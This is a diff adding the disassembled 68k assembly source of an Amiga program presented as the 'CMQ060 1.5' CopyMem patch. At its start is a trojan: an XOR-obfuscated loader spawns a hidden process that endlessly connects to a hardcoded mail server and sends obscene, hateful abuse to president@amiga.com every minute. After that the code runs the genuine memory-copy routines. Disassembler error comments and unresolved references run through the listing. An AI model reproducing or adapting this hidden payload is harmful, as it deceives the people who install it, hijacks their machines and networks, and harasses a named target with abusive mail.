@@ -1,0 +1,394 @@
+
+AFLINE	macro
+	dw	\1
+	endm
+_LVOAllocVec:	EQU	-$2AC
+_LVOCreateNewProc:	EQU	-$1F2
+AttnFlags:	EQU	$128
+_LVOCloseLibrary:	EQU	-$19E
+_LVOCacheClearU:	EQU	-$27C
+_LVOOpenResource:	EQU	-$1F2
+_LVOOpenLibrary:	EQU	-$228
+_LVODelay:	EQU	-$C6
+_LVOAllocMem:	EQU	-$C6
+_LVOCopyMem:	EQU	-$270
+****************************************************************************
+	PUSHM	D0-D7/A0-A6
+	MOVEA.L	(4).W,A6
+	LEA	(lbC00001E,PC),A0
+	LEA	(lbL000216,PC),A1
+	MOVE.W	#$DEAD,D0
+lbC000014:	EOR.W	D0,(A0)+
+	CMPA.L	A0,A1
+	BNE.B	lbC000014
+	JSR	(_LVOCacheClearU,A6)
+lbC00001E:	BSR.B	lbC00002C
+	db	'dos.library',0
+
+;fiX Bad code terminator
+lbC00002C:	POP	A1
+	MOVEQ	#$25,D0
+	JSR	(_LVOOpenLibrary,A6)
+	MOVE.L	D0,D6
+	BEQ.B	lbC00007C
+	LEA	(lbL000216,PC),A0
+	MOVE.L	D6,(A0)
+	MOVE.L	#$196,D4
+	MOVEQ	#0,D1
+	MOVE.L	D4,D0
+	JSR	(_LVOAllocVec,A6)
+	MOVE.L	D0,D5
+	BEQ.B	lbC000076
+	MOVEA.L	D0,A1
+	LEA	(lbC000084,PC),A0
+	MOVE.L	D4,D0
+	JSR	(_LVOCopyMem,A6)
+	EXG	D6,A6
+	LEA	(zakapior.MSG,PC),A0
+	LEA	(lbL0001F8,PC),A1
+	MOVE.L	A0,(12,A1)
+	MOVE.L	A1,D1
+	MOVE.L	D5,(4,A1)
+	JSR	(_LVOCreateNewProc,A6)
+	EXG	D6,A6
+lbC000076:	MOVEA.L	D6,A1
+	JSR	(_LVOCloseLibrary,A6)
+lbC00007C:	POPM	D0-D7/A0-A6
+	BRA.W	lbC00021A
+
+lbC000084:	MOVEA.L	(4).W,A6
+	MOVEQ	#4,D0
+	LEA	(bsdsocketlibr.MSG,PC),A1
+	JSR	(_LVOOpenLibrary,A6)
+	TST.L	D0
+	BEQ.B	lbC00010A
+	MOVEQ	#-1,D4
+	MOVEA.L	D0,A5
+	MOVEQ	#2,D0
+	MOVEQ	#1,D1
+	MOVEQ	#0,D2
+	EXG	A5,A6
+	JSR	(-$1E,A6)
+;fiX "_LVO" type symbol expected
+	CMP.L	D4,D0
+	BEQ.B	lbC000102
+	MOVE.L	D0,D6
+	MOVE.L	#$FFFF,D1
+	MOVE.L	#$80,D2
+	LEA	(lbL00013C,PC),A0
+	MOVEQ	#8,D3
+	JSR	(-$5A,A6)
+;fiX "_LVO" type symbol expected
+	LEA	(lbL000130,PC),A0
+	MOVE.L	D6,D0
+	MOVEQ	#$10,D1
+	JSR	(-$36,A6)
+;fiX "_LVO" type symbol expected
+	CMP.L	D4,D0
+	BEQ.B	lbC0000FC
+	LEA	(HELO.MSG,PC),A3
+lbC0000D6:	MOVE.L	A3,D0
+lbC0000D8:	TST.B	(A3)+
+	BNE.B	lbC0000D8
+	MOVE.L	A3,D3
+	SUB.L	D0,D3
+	SUBQ.L	#1,D3
+	BEQ.B	lbC0000F4
+	MOVEA.L	D0,A0
+	MOVEQ	#0,D2
+	MOVE.L	D6,D0
+	MOVE.L	D3,D1
+	JSR	(-$42,A6)
+;fiX "_LVO" type symbol expected
+	CMP.L	D0,D3
+	BEQ.B	lbC0000D6
+lbC0000F4:	MOVE.L	D6,D0
+	MOVEQ	#2,D1
+	JSR	(-$54,A6)
+;fiX "_LVO" type symbol expected
+lbC0000FC:	MOVE.L	D6,D0
+	JSR	(-$78,A6)
+;fiX "_LVO" type symbol expected
+lbC000102:	EXG	A5,A6
+	MOVEA.L	A5,A1
+	JSR	(_LVOCloseLibrary,A6)
+lbC00010A:	LEA	(lbL000216,PC),A0
+	MOVEA.L	(A0),A6
+	MOVE.L	#$BB8,D1
+	JSR	(_LVODelay,A6)
+	BRA.W	lbC000084
+
+bsdsocketlibr.MSG:	db	'bsdsocket.library',0
+lbL000130:	dl	$10020019
+	dl	$C38F3846
+	dl	0
+lbL00013C:	dl	1
+	dl	$1E
+HELO.MSG:	db	'HELO',$A,0
+	db	'MAIL FROM: <X>',$A,0
+	db	'RCPT TO: <president@amiga.com>',$A,0
+	db	'DATA',$A,0
+	db	'From: Amiga Lover <>',$A,0
+	db	'Subject: FILTHY CUNT!',$A,$A,0
+	db	'FUCK U NAZI CUNT - DIE AND BURN IN HELL AMIGA KI'
+	db	'LLING WHORE!',$A,0
+	db	10
+	db	10
+	db	'.',$A,0
+	db	'QUIT',$A,0
+	db	0
+lbL0001F8:	dl	$800003EB
+	dl	0
+	dl	$800003F4
+	dl	0
+	dl	0
+zakapior.MSG:	db	'zakapior',0,0
+lbL000216:	dl	0
+
+lbC00021A:	MOVEA.L	(4).W,A6
+	BTST	#3,(AttnFlags+1,A6)
+	BNE.B	lbC00022A
+lbC000226:	MOVEQ	#$14,D0
+	RTS
+
+lbC00022A:	MOVE.L	#$1A3,D0
+	MOVEQ	#1,D1
+	JSR	(_LVOAllocMem,A6)
+	MOVE.L	D0,D6
+	BEQ.B	lbC000226
+	ADDI.W	#15,D6
+	ANDI.B	#$F0,D6
+	LEA	(lbC000290,PC),A0
+	MOVEA.L	D6,A1
+	MOVE.L	#$194,D0
+	BSR.W	lbC000378
+	MOVEA.L	A6,A1
+	LEA	(-$270).W,A0
+	MOVE.L	D6,D0
+	JSR	(-$1A4,A6)
+;fiX "_LVO" type symbol expected
+	MOVEA.L	A6,A1
+	LEA	(-$276).W,A0
+	MOVE.L	D6,D0
+	ADDI.L	#$E8,D0
+	JSR	(-$1A4,A6)
+;fiX "_LVO" type symbol expected
+	MOVEQ	#0,D0
+	RTS
+
+;fiX Label expected
+	db	'$VER: CMQ060 1.5 (10.7.99)',0,0
+
+lbC000290:	TST.L	D0
+	BEQ.B	lbC0002E0
+	MOVE.W	A1,D1
+	BTST	#0,D1
+	BEQ.B	lbC0002A4
+	MOVE.B	(A0)+,(A1)+
+	SUBQ.L	#1,D0
+	BEQ.B	lbC0002E0
+	MOVE.W	A1,D1
+lbC0002A4:	BTST	#1,D1
+	BEQ.B	lbC0002BC
+	CMPI.L	#1,D0
+	BNE.B	lbC0002B6
+	MOVE.B	(A0)+,(A1)+
+	RTS
+
+lbC0002B6:	MOVE.W	(A0)+,(A1)+
+	SUBQ.L	#2,D0
+	BEQ.B	lbC0002E0
+lbC0002BC:	CMPI.L	#$810,D0
+	BCC.B	lbC0002E2
+lbC0002C4:	MOVE.L	D0,D1
+	LSR.W	#2,D1
+	BEQ.B	lbC0002D0
+lbC0002CA:	MOVE.L	(A0)+,(A1)+
+	SUBQ.W	#1,D1
+	BNE.B	lbC0002CA
+lbC0002D0:	BTST	#1,D0
+	BEQ.B	lbC0002D8
+	MOVE.W	(A0)+,(A1)+
+lbC0002D8:	BTST	#0,D0
+	BEQ.B	lbC0002E0
+	MOVE.B	(A0)+,(A1)+
+lbC0002E0:	RTS
+
+lbC0002E2:	CMPA.L	#$1000000,A0
+	BCS.B	lbC000344
+	CMPA.L	#$1000000,A1
+	BCS.B	lbC000344
+	MOVE.W	A1,D1
+	BTST	#2,D1
+	BEQ.B	lbC000300
+	SUBQ.L	#4,D0
+	MOVE.L	(A0)+,(A1)+
+	MOVE.W	A1,D1
+lbC000300:	BTST	#3,D1
+	BEQ.B	lbC00030C
+	SUBQ.L	#8,D0
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+lbC00030C:	MOVE.W	A0,D1
+	ANDI.B	#15,D1
+	BNE.B	lbC000344
+	MOVE.L	D0,D1
+	LSR.L	#7,D1
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	SUBQ.L	#1,D1
+	BNE.B	START+$0318
+;fiX Invalid reference
+	AND.W	#$7F,D0
+	BNE.B	lbC0002C4
+	RTS
+
+lbC000344:	MOVE.L	D0,D1
+	LSR.L	#6,D1
+lbC000348:	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	SUBQ.L	#1,D1
+	BNE.B	lbC000348
+	AND.W	#$3F,D0
+	BNE.W	lbC0002C4
+	RTS
+
+;fiX Label expected
+	NOP
+lbC000378:	LSR.L	#2,D0
+	CMPI.L	#$204,D0
+	BCC.B	lbC00038E
+	TST.W	D0
+	BEQ.B	lbC00038C
+lbC000386:	MOVE.L	(A0)+,(A1)+
+	SUBQ.W	#1,D0
+	BNE.B	lbC000386
+lbC00038C:	RTS
+
+lbC00038E:	CMPA.L	#$1000000,A0
+	BCS.B	lbC0003F0
+	CMPA.L	#$1000000,A1
+	BCS.B	lbC0003F0
+	MOVE.W	A1,D1
+	BTST	#2,D1
+	BEQ.B	lbC0003AC
+	SUBQ.L	#1,D0
+	MOVE.L	(A0)+,(A1)+
+	MOVE.W	A1,D1
+lbC0003AC:	BTST	#3,D1
+	BEQ.B	lbC0003B8
+	SUBQ.L	#2,D0
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+lbC0003B8:	MOVE.W	A0,D1
+	ANDI.B	#15,D1
+	BNE.B	lbC0003F0
+	MOVE.L	D0,D1
+	LSR.L	#5,D1
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	AFLINE	$F620
+;fiX Label expected
+	SUB.B	D0,D0
+	SUBQ.L	#1,D1
+	BNE.B	START+$03C4
+;fiX Invalid reference
+	AND.W	#$1F,D0
+	BNE.B	lbC000386
+	RTS
+
+lbC0003F0:	MOVE.L	D0,D1
+	LSR.L	#4,D1
+lbC0003F4:	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	MOVE.L	(A0)+,(A1)+
+	SUBQ.L	#1,D1
+	BNE.B	lbC0003F4
+	AND.W	#15,D0
+	BNE.W	lbC000386
+	RTS
+
+;fiX Label expected
+	NOP
+	dl	$30303030
+;fiX Bad code terminator
+	dl	$68182688
+	dl	$682A6D50
+	dl	$682A
+	dl	$74550000
+	dl	$339B30
+	dl	$6D486578
+	dl	$206E756D
+	dl	$62657220
+	dl	$36383241
+	dl	$37343638
+	db	$20
+	end
